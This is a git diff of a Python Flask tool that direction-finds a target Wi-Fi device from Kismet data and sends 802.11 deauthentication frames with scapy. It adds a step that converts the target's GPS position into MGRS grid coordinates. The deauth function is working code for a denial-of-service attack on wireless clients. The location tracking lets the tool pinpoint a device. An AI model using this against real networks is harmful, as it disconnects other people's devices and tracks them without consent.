@@ -6,10 +6,12 @@ import time
 import scapy.layers.dot11
 from scapy.all import sendp
 from mac import Mac
+import mgrs
 
 mac = Mac()
 app = Flask(__name__)
 Bootstrap(app)
+mgrs_converter = mgrs.MGRS()
 
 @app.route('/', methods=['POST', 'GET'])
 def home():
@@ -43,11 +45,18 @@ def df():
             if rssi > mac.best_seen:
                 mac.best_seen = rssi
                 mac.last_best_time = current_time
+                try:
+                    mac.lat = results[0]['kismet.common.location.geopoint'][1]
+                    mac.lon = results[0]['kismet.common.location.geopoint'][0]
+                    mac.location = location_conversion(mac.lat, mac.lon)
+                except TypeError:
+                    pass
             response[3] = mac.best_seen
             time_since_best = int(time.time() - mac.last_best_time)
             mac.last_seen_time = current_time - results[0]['kismet.device.base.last_time']
             response[4] = time_since_best
             response[5] = mac.last_seen_time
+            response[6] = mac.location
             return_string = 'data:' + json.dumps(response) + "\n\n"
             yield return_string
             time.sleep(.2)
@@ -101,7 +110,7 @@ def deauth(interface, reason, count, behavior):
             addr3=bssid,
         )
         deauth_frame = scapy.layers.dot11.Dot11Deauth(reason=reason)
-        frame_bssid = scapy.layers.dot11.RadioTap() / dot11_bssid / deauth_frame
+        frame_bssid = scapy.layers.dot11.RadioTap()/dot11_bssid/deauth_frame
         # If behavior is set to true, deauth frames of the same count will be sent to the target's BSSID using the
         # targets's MAC
         dot11_client = scapy.layers.dot11.Dot11(
@@ -111,13 +120,20 @@ def deauth(interface, reason, count, behavior):
             addr2=target_mac,
             addr3=bssid
         )
-        frame_client = scapy.layers.dot11.RadioTap() / dot11_client / deauth_frame
+        frame_client = scapy.layers.dot11.RadioTap()/dot11_client/deauth_frame
         for num in range(0, count):
             sendp(frame_bssid, iface=interface, count=1)
             if behavior:
                 sendp(frame_client, iface=interface, count=1)
     shoot(behavior=behavior, count=count)
     return f"{count} deauths sent to {mac.mac} from {mac.bssid}"
+
+def location_conversion(lat, lon):
+    if lat != "":
+        location = mgrs_converter.toMGRS(lat, lon)
+        return location
+    else:
+        return "0"
 
 
 if __name__ == "__main__":
